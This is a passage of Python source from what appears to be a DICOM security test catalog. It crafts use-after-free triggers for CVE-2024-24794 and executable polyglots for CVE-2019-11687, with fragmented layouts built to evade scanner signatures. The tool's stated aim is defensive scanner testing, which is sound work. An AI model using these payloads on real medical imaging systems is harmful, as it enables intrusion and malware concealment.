        data += struct.pack('<I', 0xFFFFFFFF)
        data += struct.pack('<HH', 0xFFFE, 0xE000)  # Item
        data += struct.pack('<I', 0xFFFFFFFF)
        # First element
        data += struct.pack('<HH', 0x0008, 0x1150)
        data += b'UI'
        data += struct.pack('<H', 10)
        data += b'1.2.3.4.5\x00'
        # DUPLICATE element
        data += struct.pack('<HH', 0x0008, 0x1150)
        data += b'UI'
        data += struct.pack('<H', 12)
        data += b'1.2.3.4.5.6\x00'
        data += struct.pack('<HH', 0xFFFE, 0xE00D)  # Item delim
        data += struct.pack('<I', 0)
        data += struct.pack('<HH', 0xFFFE, 0xE0DD)  # Sequence delim
        data += struct.pack('<I', 0)
        
        results.append(AttackResult(
            name='cve_2024_24794_01_duplicate_in_sequence',
            category='cve',
            payload=data,
            description='Duplicate tag within sequence item',
            expected_behavior='Parser may UAF in sequence context',
            metadata={'cve': 'CVE-2024-24794',
                      'delivery_hint': 'cstore'}
        ))
        
        # Test 2: Duplicate sequence delimiters
        data = struct.pack('<HH', 0x0008, 0x1115)
        data += b'SQ'
        data += b'\x00\x00'
        data += struct.pack('<I', 0xFFFFFFFF)
        data += struct.pack('<HH', 0xFFFE, 0xE000)
        data += struct.pack('<I', 0xFFFFFFFF)
        data += struct.pack('<HH', 0xFFFE, 0xE00D)  # Item delim
        data += struct.pack('<I', 0)
        data += struct.pack('<HH', 0xFFFE, 0xE0DD)  # Sequence delim
        data += struct.pack('<I', 0)
        data += struct.pack('<HH', 0xFFFE, 0xE0DD)  # DUPLICATE delim
        data += struct.pack('<I', 0)
        
        results.append(AttackResult(
            name='cve_2024_24794_02_duplicate_delimiters',
            category='cve',
            payload=data,
            description='Multiple sequence delimitation items',
            expected_behavior='Parser may process freed delimiter',
            metadata={'cve': 'CVE-2024-24794',
                      'delivery_hint': 'cstore'}
        ))
        
        # Test 3: Deeply nested duplicates (5 levels)
        data = b''
        for level in range(5):
            data += struct.pack('<HH', 0x0040, 0xA730)
            data += b'SQ'
            data += b'\x00\x00'
            data += struct.pack('<I', 0xFFFFFFFF)
            data += struct.pack('<HH', 0xFFFE, 0xE000)
            data += struct.pack('<I', 0xFFFFFFFF)
            # Duplicate at each level
            data += struct.pack('<HH', 0x0008, 0x0100)
            data += b'SH'
            data += struct.pack('<H', 4)
            data += b'ABC\x00'
            data += struct.pack('<HH', 0x0008, 0x0100)  # DUPLICATE
            data += b'SH'
            data += struct.pack('<H', 4)
            data += b'XYZ\x00'
        
        # Close all levels
        for level in range(5):
            data += struct.pack('<HH', 0xFFFE, 0xE00D)
            data += struct.pack('<I', 0)
            data += struct.pack('<HH', 0xFFFE, 0xE0DD)
            data += struct.pack('<I', 0)
        
        results.append(AttackResult(
            name='cve_2024_24794_03_deeply_nested_duplicates',
            category='cve',
            payload=data,
            description='5 levels of nesting with duplicates at each',
            expected_behavior='UAF at multiple nesting levels',
            metadata={'cve': 'CVE-2024-24794',
                      'delivery_hint': 'cstore'}
        ))
        
        return results
    
    # -------------------------------------------------------------------------
    # CVE-2019-11687: Executable Embedding (PEDICOM/ELFDICOM)
    # -------------------------------------------------------------------------
    
    # A conforming private block: the creator element claims (0009,10xx) for
    # 'C-SCARE POLYGLOT', so the carrier element that follows is a legitimate
    # vendor extension rather than an orphan tag a validator would flag.
    _POLYGLOT_PRIVATE_CREATOR = Element(0x0009, 0x0010, 'LO', 'C-SCARE POLYGLOT')

    @staticmethod
    def _polyglot_file(preamble: bytes) -> DicomFile:
        """A conformant Part-10 file carrying ``preamble`` in its first 128 bytes.

        The whole point of CVE-2019-11687 is a file that is *simultaneously*
        valid in two formats: a loader sees the preamble, a PACS sees DICOM.
        That only holds if the DICOM half is genuinely well formed — PS3.10
        requires File Meta Information (group 0002) directly after ``DICM``,
        and above all (0002,0010) Transfer Syntax UID, without which a reader
        does not know how to decode the data set.

        Emitting the preamble, ``DICM``, then jumping straight to a data set
        element left the file non-conformant, so a strict importer rejects it
        at the header and the interesting question — whether the PACS stores a
        file its scanner also considers an executable — is never reached.
        """
        df = DicomFile()
        df.preamble = preamble[:128].ljust(128, b'\x00')
        df.set_meta(
            sop_class_uid=SECONDARY_CAPTURE_SOP_CLASS_UID,
            sop_instance_uid='1.2.3.4.5',
            transfer_syntax='1.2.840.10008.1.2.1',  # Explicit VR LE
        )
        return df

    @staticmethod
    def _polyglot_identity() -> bytes:
        """The (0008,xxxx) half of the clinical body."""
        return CVEAttacks._ds_bytes([
            Element(0x0008, 0x0016, 'UI', SECONDARY_CAPTURE_SOP_CLASS_UID),
            Element(0x0008, 0x0018, 'UI', '1.2.3.4.5'),
            Element(0x0008, 0x0060, 'CS', 'OT'),
        ])

    @staticmethod
    def _polyglot_patient() -> bytes:
        """The (0010,xxxx) half of the clinical body."""
        return CVEAttacks._ds_bytes([
            Element(0x0010, 0x0010, 'PN', 'Doe^John'),
            Element(0x0010, 0x0020, 'LO', '12345'),
        ])

    @staticmethod
    def _polyglot_body(insert: bytes = b'') -> bytes:
        """The clinical half: enough of a Secondary Capture to look routine.

        ``insert`` is spliced between the identity and patient elements, which
        is where a private group 0009 carrier belongs in ascending tag order
        and — the reason it matters here — puts real Data Set structure
        between anything placed on either side of it.
        """
        return (CVEAttacks._polyglot_identity() + insert +
                CVEAttacks._polyglot_patient())

    @staticmethod
    def _polyglot_part10(preamble: bytes, lead: bytes = b'',
                         trailing: bytes = b'', insert: bytes = b'') -> bytes:
        """Assemble a polyglot: ``lead`` opens the Data Set, ``insert`` sits
        mid-body between the identity and patient elements, and ``trailing``
        follows the whole file."""
        df = CVEAttacks._polyglot_file(preamble)
        df.dataset = lead + CVEAttacks._polyglot_body(insert)
        return df.encode() + trailing

    @staticmethod
    def _polyglot_head_len(lead: bytes = b'') -> int:
        """Offset of the first byte after ``lead`` in the assembled file.

        The preamble and File Meta group are fixed-size for a given transfer
        syntax, so encoding once with an empty Data Set gives the offset at
        which the Data Set starts — which is what ``e_lfanew`` has to be
        computed against *before* the carrier element is built.
        """
        df = CVEAttacks._polyglot_file(b'\x00' * 128)
        df.dataset = b''
        return len(df.encode()) + len(lead)

    # Explicit VR long-form value header: tag (4), VR (2), 2 reserved bytes,
    # 4-byte length. The offset arithmetic below leans on it constantly.
    _LONG_FORM_HEADER_LEN = 12

    @staticmethod
    def _pedicom(bits: int = 64, fill: str = 'zeros', seed: int = 0,
                 section_size: int = 0x200, section_name: bytes = b'.pad',
                 stub: bytes = b'\x00' * 64) -> bytes:
        """Property 1 and Property 2 composed — the full PEDICOM construction.

        An MZ DOS header occupies the ignored preamble; its ``e_lfanew`` points
        past ``DICM`` and the File Meta group at a PE image parked in the value
        of an opaque private ``OB`` element. Both halves are structurally
        complete: a PE loader can walk every header, and a DICOM reader
        traverses the private element without inspecting a byte of it.

        The value is zero-padded so the PE signature lands 4-byte aligned. The
        x86 and x86-64 loaders tolerate a misaligned signature; the ARM64
        emulation layer rejects it, and the padding costs nothing in DICOM
        terms because it sits inside a value nothing parses.

        ``fill`` and ``stub`` shape what the file looks like statistically
        rather than structurally — see the entropy-profile payloads below.
        """
        creator = CVEAttacks._POLYGLOT_PRIVATE_CREATOR.encode(
            implicit_vr=False, little_endian=True)
        # The carrier goes mid-body, not in front of it: group 0009 sorts
        # after the (0008,xxxx) identity elements and before the (0010,xxxx)
        # patient ones, and PS3.5 §7.1 requires ascending tag order. Leading
        # with it produced a Data Set a strict reader is entitled to reject
        # before reaching the private element the payload is about.
        value_start = (CVEAttacks._polyglot_head_len() +
                       len(CVEAttacks._polyglot_identity()) + len(creator) +
                       CVEAttacks._LONG_FORM_HEADER_LEN)
        pad = -value_start % 4
        pe_offset = value_start + pad

        image = pe_image(pe_offset, bits=bits, section_size=section_size,
                         section_name=section_name, fill=fill, seed=seed)
        carrier = Element(0x0009, 0x1001, 'OB', b'\x00' * pad + image)
        return CVEAttacks._polyglot_part10(
            preamble=dos_header(pe_offset) + stub[:64].ljust(64, b'\x00'),
            insert=creator + carrier.encode(implicit_vr=False,
                                            little_endian=True),
        )

    @staticmethod
    def _fragmented_pedicom(bits: int = 64,
                            section_size: int = 0x200
                            ) -> Tuple[bytes, List[Dict[str, Any]]]:
        """A PE whose pieces land in three different safe zones.

        Every other polyglot in this catalog puts its foreign image in exactly
        one region, which is what a contiguous-byte signature is written
        against. Here the same image is cut along its own structural seams and
        scattered:

        * the **PE headers** go in a private ``OB`` element;
        * section ``.vend``'s data goes in the **padding tail** of a second
          private element, behind a plausible ``VENDORCFG`` value;
        * section ``.tail``'s data goes **past the final Data Element**;
        * and the patient elements sit between the second and third, so the
          gaps are filled with genuine Data Set structure rather than slack.

        Nothing executable is involved — the evasion is entirely the layout.
        ``PointerToRawData`` was always a free file offset, so the loader
        reassembles the image from three places without noticing, while a
        scanner matching a contiguous PE never sees one.

        The DOS stub is *not* one of the fragments, and that is a finding
        rather than an omission: a PE section must start on a
        ``FileAlignment`` (512-byte) boundary at or past ``SizeOfHeaders``, and
        preamble bytes 0x40–0x7F satisfy neither. It carries a marker instead.

        Returns the payload and a description of where each fragment landed.
        """
        head = CVEAttacks._polyglot_head_len()
        identity = CVEAttacks._polyglot_identity()
        patient = CVEAttacks._polyglot_patient()
        creator = CVEAttacks._POLYGLOT_PRIVATE_CREATOR.encode(
            implicit_vr=False, little_endian=True)
        long_form = CVEAttacks._LONG_FORM_HEADER_LEN

        # Fragment 1 — the headers, in a private OB element.
        headers_value_start = (head + len(identity) + len(creator) + long_form)
        pad = -headers_value_start % 4          # 4-align the PE signature
        pe_offset = headers_value_start + pad
        headers_len = pe_headers_len(bits, sections=2)
        size_of_headers = align_up(pe_offset + headers_len, FILE_ALIGNMENT)
        headers_value_len = pad + headers_len
        headers_value_len += headers_value_len % 2   # OB values are even-length
        after_headers = headers_value_start + headers_value_len

        # Fragment 2 — section .vend, in the padding tail of a second private
        # element whose declared length covers it.
        content = b'VENDORCFG\x00'
        vend_value_start = after_headers + long_form
        vend_offset = align_up(
            max(vend_value_start + len(content), size_of_headers),
            FILE_ALIGNMENT)
        gap = vend_offset - (vend_value_start + len(content))
        after_vend = vend_offset + section_size

        # Fragment 3 — section .tail, past the end of the Data Set.
        end_of_dataset = after_vend + len(patient)
        tail_offset = align_up(end_of_dataset, FILE_ALIGNMENT)
        trailing_gap = tail_offset - end_of_dataset

        headers, (vend, tail) = pe_fragments(
            pe_offset,
            [(vend_offset, section_size), (tail_offset, section_size)],
            bits=bits, names=[b'.vend', b'.tail'])

        carriers = (
            Element(0x0009, 0x1001, 'OB', b'\x00' * pad + headers),
            Element(0x0009, 0x1002, 'UN', content + b'\x00' * gap + vend),
        )
        payload = CVEAttacks._polyglot_part10(
            preamble=dos_header(pe_offset) + dos_stub(
                b'C-SCARE: no PE section fits here (FileAlignment)'),
            insert=creator + b''.join(
                c.encode(implicit_vr=False, little_endian=True)
                for c in carriers),
            trailing=b'\x00' * trailing_gap + tail,
        )

        fragments = [
            {'zone': 'preamble_dos_header', 'offset': 0, 'length': 64,
             'part': 'DOS header'},
            {'zone': 'private_element', 'offset': pe_offset,
             'length': headers_len, 'part': 'PE headers and section table'},
            {'zone': 'element_padding', 'offset': vend_offset,
             'length': len(vend), 'part': "section '.vend' raw data"},
            {'zone': 'trailing', 'offset': tail_offset, 'length': len(tail),
             'part': "section '.tail' raw data"},
        ]
        for fragment in fragments:
            end = fragment['offset'] + fragment['length']
            assert end <= len(payload), (fragment, len(payload))
        return payload, fragments

    @staticmethod
    def _pedicom_published_tag(bits: int = 64) -> bytes:
        """PEDICOM with the carrier at (0009,0000), as the paper describes it.

        Aguilar & Palmer §5.2 report the reference implementation using
        "group 0x0009, element 0x0000, with a 12-byte Explicit VR (long form)
        header". That is the Group Length tag, which PS3.5 does not permit to
        hold an OB value, and there is no Private Creator claiming a block —
        Hetzel et al. §3.2 note a vendor "must first define a Private Creator
        Data Element to reserve a range of Data Element Numbers".

        Every other payload here uses the conformant form, because a validator
        can reject the published shape for a reason unrelated to what it
        hides. This one reproduces the published shape anyway: it is what the
        released toolkit emits, so a detector tuned only against a proper
        private block would miss the tool actually in circulation. pydicom
        reads it, which is the point — non-conformant is not the same as
        unparseable.
        """
        head = CVEAttacks._polyglot_head_len()
        identity = CVEAttacks._polyglot_identity()
        value_start = (head + len(identity) +
                       CVEAttacks._LONG_FORM_HEADER_LEN)
        pad = -value_start % 4
        pe_offset = value_start + pad

        carrier = Element(0x0009, 0x0000, 'OB',
                          b'\x00' * pad + pe_image(pe_offset, bits=bits))
        return CVEAttacks._polyglot_part10(
            preamble=dos_header(pe_offset) + dos_stub(),
            insert=carrier.encode(implicit_vr=False, little_endian=True),
        )

    @staticmethod
    def _fragmented_elfdicom(bits: int = 64
                             ) -> Tuple[bytes, List[Dict[str, Any]]]:
        """An ELF split across four regions, one of which no PE can use.

        The PE fragmentation payload had to leave the preamble's DOS-stub zone
        empty: a PE section must start on a 512-byte ``FileAlignment``
        boundary at or past ``SizeOfHeaders``, and bytes 0x40-0x7F satisfy
        neither. ELF has no such rule — a ``PT_LOAD`` may begin at any file
        offset provided ``p_vaddr`` agrees with it modulo the page size — so
        the same 64 bytes hold a real segment here.

        That is the concrete reason a scanner cannot reuse its PE reasoning:
        the regions worth searching are not the same regions, and the ELF set
        is strictly larger.

        Layout: header at 0, one segment in the preamble tail, the program
        header table in a private element, a second segment in an element's
        padding tail, and a third past the end of the Data Set.
        """
        head = CVEAttacks._polyglot_head_len()
        identity = CVEAttacks._polyglot_identity()
        patient = CVEAttacks._polyglot_patient()
        creator = CVEAttacks._POLYGLOT_PRIVATE_CREATOR.encode(
            implicit_vr=False, little_endian=True)
        long_form = CVEAttacks._LONG_FORM_HEADER_LEN
        phdr_len = ELF_PHDR_LEN[bits]
        header_len = ELF_HEADER_LEN[bits]

        # Segment A: the preamble bytes the ELF header does not occupy.
        stub_offset = header_len
        stub_size = PART10_PREAMBLE_LEN - header_len

        # The program header table, in a private OB element.
        table_value_start = (head + len(identity) + len(creator) + long_form)
        pad = -table_value_start % 8      # natural alignment of the phdr fields
        table_offset = table_value_start + pad
        table_len = 3 * phdr_len
        table_value_len = pad + table_len
        table_value_len += table_value_len % 2
        after_table = table_value_start + table_value_len

        # Segment B: the padding tail of a second private element. No
        # alignment maths — ELF takes the offset as it falls.
        content = b'VENDORCFG\x00'
        b_value_start = after_table + long_form
        seg_b_offset = b_value_start + len(content)
        seg_b_size = 0x100
        after_b = b_value_start + len(content) + seg_b_size

        # Segment C: past the final Data Element.
        seg_c_offset = after_b + len(patient)
        seg_c_size = 0x100

        table, (seg_a, seg_b, seg_c) = elf_fragments(
            table_offset,
            [(stub_offset, stub_size), (seg_b_offset, seg_b_size),
             (seg_c_offset, seg_c_size)],
            bits=bits)

        carriers = (
            Element(0x0009, 0x1001, 'OB', b'\x00' * pad + table),
            Element(0x0009, 0x1002, 'UN', content + seg_b),
        )
        payload = CVEAttacks._polyglot_part10(
            preamble=elf_header(table_offset, ph_count=3, bits=bits) + seg_a,
            insert=creator + b''.join(
                c.encode(implicit_vr=False, little_endian=True)
                for c in carriers),
            trailing=seg_c,
        )

        fragments = [
            {'zone': 'preamble_dos_stub', 'offset': stub_offset,
             'length': stub_size,
             'part': 'PT_LOAD 0 — a region no PE section can occupy'},
            {'zone': 'private_element', 'offset': table_offset,
             'length': table_len, 'part': 'program header table'},
            {'zone': 'element_padding', 'offset': seg_b_offset,
             'length': seg_b_size, 'part': 'PT_LOAD 1'},
            {'zone': 'trailing', 'offset': seg_c_offset,
             'length': seg_c_size, 'part': 'PT_LOAD 2'},
        ]
        for fragment in fragments:
            end = fragment['offset'] + fragment['length']
            assert end <= len(payload), (fragment, len(payload))
        return payload, fragments

    @staticmethod
    def _elfdicom_on_carrier(bits: int = 64, fill: str = 'strings',
                             segment_size: int = 0x400,
                             elf_type: int = ELF_TYPE_EXEC
                             ) -> Tuple[bytes, Dict[str, Any]]:
        """ELFDICOM embedded in a complete Secondary Capture image.

        The Linux counterpart of :meth:`_pedicom_on_carrier`, and the payload
        to reach for against a Linux PACS: an object the archive accepts on
        IOD grounds, which a ``file(1)``/``binfmt_elf`` magic check also calls
        an ELF executable. Only the preamble is replaced — the ELF header
        fits the first 64 bytes exactly — so the image still renders.
        """
        host = secondary_capture_carrier()
        before = inspect_carrier(host)
        data, offset = embed_in_carrier(
            host,
            lambda at: elf_image(at, bits=bits, segment_size=segment_size,
                                 fill=fill),
            align=8,
            preamble=lambda at: elf_header(
                at, ph_count=1, bits=bits, elf_type=elf_type).ljust(
                    PART10_PREAMBLE_LEN, b'\x00'),
        )
        after = inspect_carrier(data)
        return data, {
            'ph_offset': offset,
            'elf_bits': bits,
            'elf_type': 'ET_DYN' if elf_type == ELF_TYPE_DYN else 'ET_EXEC',
            'carrier_sop_instance_uid': after.sop_instance_uid,
            'carrier_pixel_data_offset': after.pixel_data_offset,
            'carrier_pixel_data_bytes': after.pixel_data_length,
            'carrier_pixel_data_intact':
                before.pixel_data_length == after.pixel_data_length,
        }

    @staticmethod
    def _elfdicom(bits: int = 64, segment_size: int = 0x200) -> bytes:
        """The ELF counterpart of :meth:`_pedicom`, with ELF's own rules.

        The 64-byte ``Elf64_Ehdr`` fits the first half of the preamble exactly,
        and ``e_phoff`` points past ``DICM`` at a program header table and its
        ``PT_LOAD`` segment in a private ``OB`` element. That is as far as the
        analogy with PE goes:

        * the ELF header itself cannot move — there is no ``e_lfanew``
          equivalent, so offset 0 is the only place a reader looks for it;
        * ``PT_LOAD`` wants ``p_offset`` congruent to ``p_vaddr`` modulo the
          page size, not aligned to a boundary, so the payload picks a virtual
          address to fit whatever offset the DICOM layout produced instead of
          padding to reach one;
        * ``e_phoff`` is padded only to 8, the natural alignment of the
          ``Elf64_Phdr`` fields a reader will cast over it.

        The image is structurally valid and deliberately not loadable: no
        ``PT_INTERP``, no ``PT_LOAD`` covering the headers, entry point 0.
        """
        creator = CVEAttacks._POLYGLOT_PRIVATE_CREATOR.encode(
            implicit_vr=False, little_endian=True)
        head = CVEAttacks._polyglot_head_len()
        identity = CVEAttacks._polyglot_identity()
        value_start = (head + len(identity) + len(creator) +
                       CVEAttacks._LONG_FORM_HEADER_LEN)
        pad = -value_start % 8
        ph_offset = value_start + pad

        image = elf_image(ph_offset, bits=bits, segment_size=segment_size)
        carrier = Element(0x0009, 0x1001, 'OB', b'\x00' * pad + image)
        return CVEAttacks._polyglot_part10(
            preamble=elf_header(ph_offset, ph_count=1, bits=bits).ljust(
                128, b'\x00'),
            insert=creator + carrier.encode(implicit_vr=False,
                                            little_endian=True),
        )

    @staticmethod
    def _machodicom(arch: str = 'arm64', segment_size: int = 0x200) -> bytes:
        """The Mach-O counterpart of :meth:`_pedicom`, which relocates least.

        ``mach_header_64`` and its load commands must be contiguous, so both
        live in the preamble — 104 bytes of the 128 available, and a second
        ``LC_SEGMENT_64`` or a single ``section_64`` would not fit. Only the
        segment *contents* move out to a private ``OB`` element, addressed by
        ``fileoff``.

        The payload therefore tests one thing honestly: whether a scanner's
        magic table and load-command walk reach an embedded Mach-O. It does
        not test loadability — arm64 macOS requires a valid code signature
        before ``execve`` will touch an image, and that cannot be synthesised
        inertly.
        """
        creator = CVEAttacks._POLYGLOT_PRIVATE_CREATOR.encode(
            implicit_vr=False, little_endian=True)
        head = CVEAttacks._polyglot_head_len()
        identity = CVEAttacks._polyglot_identity()
        value_start = (head + len(identity) + len(creator) +
                       CVEAttacks._LONG_FORM_HEADER_LEN)
        pad = -value_start % 8
        segment_offset = value_start + pad

        carrier = Element(0x0009, 0x1001, 'OB',
                          b'\x00' * pad + macho_image(segment_size))
        return CVEAttacks._polyglot_part10(
            preamble=macho_header(segment_offset, segment_size,
                                  arch=arch).ljust(128, b'\x00'),
            insert=creator + carrier.encode(implicit_vr=False,
                                            little_endian=True),
        )

    # -- Embedding into a real, storable image object ----------------------
    #
    # The payloads above build their own minimal Part-10 file, which proves
    # the structure and stops there: a Secondary Capture with no Pixel Data,
    # no Study or Series UID and no image geometry is an incomplete object,
    # and an archive rejects it against the IOD before any private element is
    # read. These carry the same constructions on an object a PACS has no
    # reason to refuse, so a rejection means something.

    @staticmethod
    def _pedicom_on_carrier(bits: int = 64, fill: str = 'zeros',
                            section_size: int = 0x200,
                            section_name: bytes = b'.rdata'
                            ) -> Tuple[bytes, Dict[str, Any]]:
        """PEDICOM embedded in a complete Secondary Capture image.

        The private element sorts between the (0008,xxxx) and (0010,xxxx)
        groups, so the PE lands well ahead of (7FE0,0010) and the image is
        untouched — the object still renders as the gradient a viewer would
        show. ``e_lfanew`` is resolved against the finished file, which is why
        the image is built by a callback that receives its own offset.
        """
        host = secondary_capture_carrier()
        before = inspect_carrier(host)
        data, offset = embed_in_carrier(
            host,
            lambda at: pe_image(at, bits=bits, section_size=section_size,
                                section_name=section_name, fill=fill),
            align=4,
            preamble=lambda at: dos_header(at) + dos_stub(),
        )
        after = inspect_carrier(data)
        return data, {
            'pe_offset': offset,
            'pe_bits': bits,
            'carrier_sop_class_uid': after.sop_class_uid,
            'carrier_sop_instance_uid': after.sop_instance_uid,
            'carrier_pixel_data_offset': after.pixel_data_offset,
            'carrier_pixel_data_bytes': after.pixel_data_length,
            'carrier_pixel_data_intact':
                before.pixel_data_length == after.pixel_data_length,
        }

    # The published example magic from the V3GAS talk's SLDPLD format. The
    # talk states the real string is generated per engagement, so a signature
    # on this literal catches only the demo — which is exactly what the pair
    # of payloads below is for.
    _SLDPLD_EXAMPLE_MAGIC = b'SLDPLD\x00\x00'
    _SLDPLD_ALTERNATE_MAGIC = b'CSCARE\x00\x00'

    @staticmethod
    def _tagged_blob(magic: bytes, body: bytes) -> bytes:
        """``[magic 8B][size uint32 LE][body]`` — the SLDPLD container shape.

        The framing is the durable signal. A loader that reads a length-
        prefixed blob out of a private element needs a magic to find it and a
        size to bound it, whatever bytes it later hands to something else, so
        a detector keyed on the *structure* keeps working when the magic
        changes and one keyed on the string does not.

        ``body`` here is an inert marker. Nothing in this catalog emits
        executable code, and a container carrying a marker exercises exactly
        the same recogniser.
        """
        if len(magic) != 8:
            raise ValueError(f'magic is {len(magic)} bytes, must be 8')
        return magic + struct.pack('<I', len(body)) + body

    @staticmethod
    def _sldpld_on_carrier(magic: bytes) -> Tuple[bytes, Dict[str, Any]]:
        """A length-prefixed private-tag container on a storable image.

        Placed the way the talk describes it — a private element after the
        File Meta group and ahead of the pixel data — so a viewer renders the
        image and a conforming parser walks past the container without
        inspecting it.
        """
        marker = (b'C-SCARE INERT MARKER: this container carries no code. '
                  b'It exists so a scanner can be tested against the '
                  b'framing, not against a payload.')
        body = CVEAttacks._tagged_blob(magic, marker)
        host = secondary_capture_carrier()
        before = inspect_carrier(host)
        data, offset = embed_in_carrier(host, lambda _at: body, align=2)
        after = inspect_carrier(data)
        return data, {
            'container_offset': offset,
            'container_magic': magic.rstrip(b'\x00').decode('ascii'),
            'container_body_bytes': len(marker),
            'carrier_pixel_data_offset': after.pixel_data_offset,
            'carrier_pixel_data_intact':
                before.pixel_data_length == after.pixel_data_length,
        }

    @staticmethod
    def cve_2019_11687_polyglot() -> List[AttackResult]:
        """
        CVE-2019-11687: Executable Embedding in DICOM Preamble

        The 128-byte preamble can contain PE/ELF headers, making the file
        valid as both DICOM and executable.

        Payloads split along four axes.

        *Which second format* the file also claims to be — PE, ELF, Mach-O,
        shell, batch, TIFF — decides whether a scanner's magic-byte table fires
        at all. The three executable formats are built to their own rules
        rather than by transposing the PE construction, because they do not
        relocate the same things: see :meth:`_elfdicom` and
        :meth:`_machodicom`.

        *Which safe zone* carries the foreign bytes decides whether the scanner
        ever reads them: the preamble is in front of every reader, while a
        private element, an element's padding tail, and the space past the
        final element are all regions a conforming parser walks over without
        inspecting. ``metadata['zone']`` names the region under test.

        *Whether the payload is contiguous* decides whether a signature written
        over a whole image can match it at all. ``zone='fragmented'`` marks the
        payload that is cut across three regions with Data Set structure in
        between; ``metadata['fragments']`` maps where each piece landed.

        *What the bytes look like statistically* decides whether an entropy or
        histogram triage step separates the file from a benign one before
        anything parses it. ``metadata['fill']`` names the content profile.
        """
        results = []

        # Test 1: the full PEDICOM cross-reference — MZ in the ignored
        # preamble, PE image in an opaque private element (PE32+, x86-64).
        results.append(AttackResult(
            name='cve_2019_11687_01_pe_header',
            category='cve',
            payload=CVEAttacks._pedicom(bits=64),
            description='DOS header in the preamble whose e_lfanew points at a '
                        'PE32+ image in a private OB element (PEDICOM)',
            expected_behavior='Scanner should detect the PE image behind the '
                              'preamble; PACS should not store an executable',
            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'PE',
                      'zone': 'private_element', 'pe_bits': 64}
        ))

        # Test 2: a complete Elf64_Ehdr in the preamble. It is exactly 64 bytes
        # and needs no relocation pointer, so unlike PE the whole ELF header
        # fits in the first half of the preamble with nothing left dangling.
        results.append(AttackResult(
            name='cve_2019_11687_02_elf_header',
            category='cve',
            payload=CVEAttacks._polyglot_part10(
                elf_header(ph_offset=0, ph_count=0).ljust(128, b'\x00')),
            description='Complete 64-byte Elf64_Ehdr in the DICOM preamble '
                        '(ELFDICOM)',
            expected_behavior='Scanner should detect ELF signature',
            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'ELF',
                      'zone': 'preamble_dos_header', 'elf_bits': 64}
        ))

        # Test 3: Shell script in preamble.
        #
        # The `exit 0` is load-bearing. A shebang and a comment marker are not
        # enough: `#` comments to the end of its line only, so without an exit
        # the interpreter runs on into the Data Set and parses DICOM bytes as
        # shell. `sh -n` rejected the earlier version with "EOF in backquote
        # substitution" — it was a file that *looked* like a script polyglot
        # and was not one. Hetzel et al. Fig. 2 shows the same construction
        # with "a proper exit from the script" for this reason.
        script = b'#!/bin/sh\nexit 0\n#'
        script += b'\x00' * (128 - len(script))

        results.append(AttackResult(
            name='cve_2019_11687_03_script_preamble',
            category='cve',
            payload=CVEAttacks._polyglot_part10(script),
            description='POSIX shell script in the DICOM preamble that exits '
                        'before the Data Set',
            expected_behavior='Scanner should detect the shebang; a file that '
                              'is both a rendered image and a script the '
                              'shell will run is the point',
            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'shell',
                      'zone': 'preamble_dos_header'}
        ))

        # Test 4: Batch script in preamble. `EXIT /B` for the same reason
        # `exit 0` is there in test 3 — REM comments one line, and cmd.exe
        # would otherwise keep reading the Data Set as batch commands.
        batch = b'@echo off\r\nEXIT /B 0\r\nREM '
        batch += b' ' * (128 - len(batch))

        results.append(AttackResult(
            name='cve_2019_11687_04_batch_preamble',
            category='cve',
            payload=CVEAttacks._polyglot_part10(batch),
            description='Windows batch script in the DICOM preamble that '
                        'exits before the Data Set',
            expected_behavior='Scanner should detect batch content in the '
                              'preamble',
            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'batch',
                      'zone': 'preamble_dos_header'}
        ))

        # Test 5: a complete 1x1 TIFF inside the preamble.
        #
        # Whole-slide imaging really does ship TIFF/DICOM dual-purpose files,
        # so this one has to open as an image, not just carry the magic. The
        # earlier version declared an IFD with zero directory entries: `file`
        # reported "TIFF image data, direntries=0" while Pillow refused it
        # with UnidentifiedImageError, which made it a magic probe wearing a
        # dual-purpose label.
        #
        # Eight tags is the minimum a reader needs, and at 12 bytes each the
        # whole structure plus one pixel fits the 128-byte preamble with room
        # to spare.
        _tiff_ifd_offset = 8
        _tiff_entries = [
            (0x0100, 3, 1, 1),        # ImageWidth  = 1
            (0x0101, 3, 1, 1),        # ImageLength = 1
            (0x0102, 3, 1, 8),        # BitsPerSample = 8
            (0x0103, 3, 1, 1),        # Compression = none
            (0x0106, 3, 1, 1),        # PhotometricInterpretation = BlackIsZero
            (0x0111, 4, 1, 0),        # StripOffsets — patched below
            (0x0116, 3, 1, 1),        # RowsPerStrip = 1
            (0x0117, 4, 1, 1),        # StripByteCounts = 1
        ]
        _tiff_pixel_offset = (_tiff_ifd_offset + 2
                              + len(_tiff_entries) * 12 + 4)
        tiff = b'II*\x00' + struct.pack('<I', _tiff_ifd_offset)
        tiff += struct.pack('<H', len(_tiff_entries))
        for tag, field_type, count, value in _tiff_entries:
            if tag == 0x0111:
                value = _tiff_pixel_offset
            # Values <= 4 bytes live in the value field itself, left-aligned.
            tiff += struct.pack('<HHI', tag, field_type, count)
            tiff += (struct.pack('<H', value) + b'\x00\x00'
                     if field_type == 3 else struct.pack('<I', value))
        tiff += struct.pack('<I', 0)          # no next IFD
        tiff += b'\x80'                       # the single mid-grey pixel
        assert len(tiff) == _tiff_pixel_offset + 1, len(tiff)
        tiff = tiff.ljust(128, b'\x00')       # pad out the 128-byte preamble

        file_data = CVEAttacks._polyglot_part10(tiff)

        results.append(AttackResult(
            name='cve_2019_11687_05_tiff_header',
            category='cve',
            payload=file_data,
            description='TIFF header in DICOM preamble (dual-purpose TIFF/DICOM)',
            expected_behavior='Scanner should detect TIFF signature',
            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'TIFF',
                      'zone': 'preamble_dos_header'}
        ))

        # Test 6: Mach-O header plus its load commands in the preamble. The
        # published construction targets the Windows loader, but the preamble
        # is loader-agnostic — a scanner whose magic table stops at MZ and
        # \x7fELF misses this one entirely. Load commands have to sit
        # contiguously behind the header, so at 104 bytes this is very nearly
        # the largest Mach-O that fits a 128-byte preamble at all.
        results.append(AttackResult(
            name='cve_2019_11687_06_macho_header',
            category='cve',
            payload=CVEAttacks._polyglot_part10(
                macho_header(segment_offset=0, segment_size=0,
                             arch='arm64').ljust(128, b'\x00')),
            description='mach_header_64 and a complete LC_SEGMENT_64 in the '
                        'DICOM preamble',
            expected_behavior='Scanner should detect Mach-O signature',
            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'MachO',
                      'zone': 'preamble_dos_header', 'macho_arch': 'arm64'}
        ))

